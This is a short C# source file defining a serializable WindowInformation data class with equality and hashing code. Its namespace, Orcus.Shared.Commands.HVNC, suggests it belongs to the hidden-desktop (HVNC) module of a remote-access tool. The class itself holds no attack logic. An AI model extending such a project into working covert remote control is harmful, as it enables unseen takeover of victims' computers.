using System;

namespace Orcus.Shared.Commands.HVNC
{
    [Serializable]
    public class WindowInformation
    {
        public string Title { get; set; }
        public Int64 Handle { get; set; }
        public int X { get; set; }
        public int Y { get; set; }
        public int Width { get; set; }
        public int Height { get; set; }

        protected bool Equals(WindowInformation other)
        {
            return string.Equals(Title, other.Title) && Handle == other.Handle && X == other.X && Y == other.Y &&
                   Width == other.Width && Height == other.Height;
        }

        public override int GetHashCode()
        {
            unchecked
            {
                var hashCode = Title?.GetHashCode() ?? 0;
                hashCode = (hashCode*397) ^ (int) Handle;
                hashCode = (hashCode*397) ^ X;
                hashCode = (hashCode*397) ^ Y;
                hashCode = (hashCode*397) ^ Width;
                hashCode = (hashCode*397) ^ Height;
                return hashCode;
            }
        }

        public override bool Equals(object obj)
        {
            if (ReferenceEquals(null, obj)) return false;
            if (ReferenceEquals(this, obj)) return true;
            if (obj.GetType() != GetType()) return false;
            return Equals((WindowInformation) obj);
        }
    }
}